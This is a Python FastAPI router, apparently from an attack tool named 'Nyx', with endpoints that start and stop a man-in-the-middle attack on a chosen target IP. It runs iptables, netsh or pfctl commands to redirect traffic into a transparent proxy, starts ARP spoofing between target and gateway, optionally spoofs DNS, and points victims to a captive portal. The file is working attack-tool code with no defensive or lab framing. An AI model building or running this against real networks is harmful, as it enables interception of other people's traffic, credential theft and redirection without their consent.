import asyncio
import logging
import os
import platform
import subprocess
import sys

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from core.proxy.engine import ProxyEngine, setup_transparent_redirect
from modules.arp_spoof import ARPSpoofer
from modules.dns_spoof import DNSSpoofer

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/mitm", tags=["mitm"])

_engine: ProxyEngine | None = None
_spoofer: ARPSpoofer | None = None
_dns_spoofer: DNSSpoofer | None = None
_redirect_active = False


def init_mitm(engine: ProxyEngine):
    global _engine
    _engine = engine


def _is_admin() -> bool:
    try:
        if platform.system().lower() == "windows":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.geteuid() == 0
    except Exception:
        return False


def _exec_admin_redirect(proxy_port: int, enable: bool) -> list[str]:
    cmds = setup_transparent_redirect(proxy_port, enable)
    if not _is_admin():
        return cmds
    executed = []
    for cmd in cmds:
        try:
            sys = platform.system().lower()
            if sys == "windows" and cmd.startswith("netsh"):
                subprocess.run(cmd, shell=True, check=True, capture_output=True)
                executed.append(cmd)
            elif sys == "linux" and (cmd.startswith("iptables") or cmd.startswith("sysctl")):
                subprocess.run(cmd.split(), check=True, capture_output=True)
                executed.append(cmd)
            elif sys == "darwin" and (cmd.startswith("pfctl") or cmd.startswith("sysctl") or cmd.startswith("echo")):
                subprocess.run(cmd, shell=True, check=True, capture_output=True)
                executed.append(cmd)
        except subprocess.CalledProcessError as e:
            logger.warning("Redirect command failed (may already be set): %s -> %s", cmd, e)
    return executed


class MITMStartRequest(BaseModel):
    target_ip: str
    gateway_ip: str | None = None
    enable_dns_spoof: bool = True


class MITMStartResponse(BaseModel):
    status: str
    message: str
    admin_mode: bool
    captive_portal_url: str


class MITMStopResponse(BaseModel):
    status: str
    message: str


@router.post("/start", response_model=MITMStartResponse)
async def mitm_start(req: MITMStartRequest):
    global _spoofer, _dns_spoofer, _redirect_active

    if _engine is None:
        raise HTTPException(status_code=500, detail="Proxy engine not initialized")

    if _spoofer is not None or _dns_spoofer is not None:
        raise HTTPException(status_code=409, detail="MITM already active, stop first")

    admin = _is_admin()
    if not admin:
        logger.warning("Not running as admin — ARP spoofing and port redirect will fail. Run Nyx as administrator.")
    else:
        logger.info("Running with admin privileges")

    if _engine.mode != "transparent":
        ok = _engine.switch_to_transparent()
        if not ok:
            raise HTTPException(500, detail="Failed to switch proxy to transparent mode")

    cmds = _exec_admin_redirect(_engine.port, enable=True)
    if not cmds:
        logger.warning("No redirect commands were executed. ARP + transparent proxy may not capture traffic.")
    else:
        logger.info("Port redirection commands executed: %s", cmds)
    _redirect_active = bool(cmds)

    _spoofer = ARPSpoofer(target_ip=req.target_ip, gateway_ip=req.gateway_ip)
    try:
        await _spoofer.start()
    except Exception as e:
        logger.error("ARP spoofing failed to start: %s", e)
        _spoofer = None
        raise HTTPException(500, detail=f"ARP spoofing failed: {e}")

    dns_active = False
    if req.enable_dns_spoof:
        _dns_spoofer = DNSSpoofer(spoof_ip="0.0.0.0")
        try:
            await _dns_spoofer.start()
            dns_active = True
        except Exception as e:
            logger.error("DNS spoofing failed to start: %s", e)
            _dns_spoofer = None

    warnings = []
    if not admin:
        warnings.append("Not running as administrator. ARP spoofing and port redirection require admin rights.")
    if not _redirect_active:
        warnings.append("Port redirection not active. Traffic on port 80/443 will not reach the proxy.")
    if not dns_active and req.enable_dns_spoof:
        warnings.append("DNS spoofing failed to start.")

    return MITMStartResponse(
        status="ok",
        message=(
            f"MITM active against {req.target_ip}. "
            f"ARP spoofing {_spoofer.gateway_ip} <-> {req.target_ip}. "
            f"{'DNS spoofing active.' if dns_active else ''} "
            f"{'Warnings: ' + '; '.join(warnings) if warnings else ''}"
        ),
        admin_mode=admin,
        captive_portal_url="http://<YOUR-IP>:8000/api/mitm/portal",
    )


@router.post("/stop", response_model=MITMStopResponse)
async def mitm_stop():
    global _spoofer, _dns_spoofer, _redirect_active

    if _dns_spoofer:
        await _dns_spoofer.stop()
        _dns_spoofer = None

    if _spoofer:
        await _spoofer.stop()
        _spoofer = None

    if _redirect_active:
        _exec_admin_redirect(0, enable=False)
        _redirect_active = False

    return MITMStopResponse(
        status="ok",
        message="MITM stopped. Traffic restored.",
    )


@router.get("/status")
async def mitm_status():
    global _spoofer, _dns_spoofer
    arp_running = _spoofer is not None and getattr(_spoofer, '_running', False)
    dns_running = _dns_spoofer is not None and getattr(_dns_spoofer, '_running', False)
    return {
        "active": arp_running or dns_running,
        "arp_spoofing": arp_running,
        "dns_spoofing": dns_running,
        "target_ip": _spoofer.target_ip if _spoofer else None,
        "gateway_ip": _spoofer.gateway_ip if _spoofer else None,
        "admin_mode": _is_admin(),
        "proxy_mode": _engine.mode if _engine else None,
        "redirect_active": _redirect_active,
    }
